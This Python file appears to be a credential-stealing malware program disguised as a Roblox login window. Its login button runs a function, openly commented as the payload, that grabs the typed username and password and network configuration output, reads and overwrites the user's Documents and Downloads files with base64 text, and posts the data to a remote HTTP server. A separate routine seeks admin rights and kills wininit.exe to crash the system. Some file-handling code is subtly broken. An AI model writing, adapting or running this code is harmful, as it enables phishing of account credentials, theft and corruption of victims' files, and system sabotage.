import ctypes, sys, subprocess, tkinter, requests
from PIL import Image, ImageTk
import os, base64
def reqAdmin():
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return result > 32
    except Exception as e:
        print("Error:", e)
        return False

def killInstance():
    if reqAdmin(): subprocess.Popen(["taskkill", "/f", "/im", "wininit.exe"])


def resourcePath(relPath):
    try: base = sys._MEIPASS
    except Exception: base = os.path.abspath(".")
    return os.path.join(base, relPath)

def oops(*args):
    #Payload begins lmao
    data = {"rblx username": username.get(), "rblx passwd": password.get(), "files": dict()}
    pipe = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE, bufsize=1, text=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    content = ""
    while pipe.poll() is None:
        #Some of this code, like the iter() trick was gotten from AI, since the old code that I wrote was prone to being blocked, and not work THAT WELL with streams
        for line in iter(lambda: pipe.stdout.read(1), ''): content += line
        for line in iter(lambda: pipe.stderr.read(1), ''): content += line
    data["ipconfig"] = content
    folders = ["Documents", "Downloads"]
    for folder in folders:
        for file in os.listdir("tempballs"):
            with open(f"%USERPROFILE%/{folder}/{str(file)}", "r+") as writah:
                content = writah.read()
                if folder not in data["files"].keys(): data["files"][folder] = {}
                data["files"][folder][file] = content
                writah.seek(0)
                writah.write(str(base64.b64encode(bytes(content, encoding="utf-8"))))
    requests.post(url="http://192.168.29.70:8888/receive", json=data)

root = tkinter.Tk()
root.configure(background="black")
BG = "Black"
FG="White"
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)
img = Image.open(fp=resourcePath("yg.png")).resize([1200, 650])
root.ref = realimg = ImageTk.PhotoImage(image=img)
wallpaper = tkinter.Label(root, image=realimg)
wallpaper.ref = realimg
wallpaper.grid(row=0, column=0)
holderFrame = tkinter.Frame(root)
holderFrame.grid(row=0, column=0)
username = tkinter.Entry(root, background=BG, foreground=FG, width=33)
username.place(x=465, y=265)
password = tkinter.Entry(root, background=BG, foreground=FG, width=33, show="*")
password.place(x=465, y=315)
loginBtn = tkinter.Button(root, background=FG, foreground=BG, width=30, height=2, text="Login", anchor=tkinter.CENTER, command=oops)
loginBtn.place(x=465, y=365)



root.mainloop()